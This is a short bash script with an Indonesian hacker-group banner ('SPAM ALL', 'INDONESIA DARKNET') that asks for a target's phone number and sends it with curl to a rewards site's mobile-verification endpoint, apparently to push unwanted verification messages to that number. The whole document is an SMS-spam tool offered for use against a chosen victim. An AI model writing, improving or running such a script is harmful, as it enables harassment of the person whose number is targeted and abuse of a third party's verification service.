#!/bin/bash

clear
figlet SPAM ALL
echo
sleep 2
echo -e "===================================="
echo -e "=PEMBUAT = MR_RIDHO                 "
echo -e "=TEAM = INDONESIA DARKNET           "
echo -e "=MASTER = MR_DARK                   "
echo -e "=TEMAN = MR.DARK,MR.SANTRI NAKAL    "
echo -e "===================================="
echo
read -p "MASUKAN NOMOR TARGET :" nomor 
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link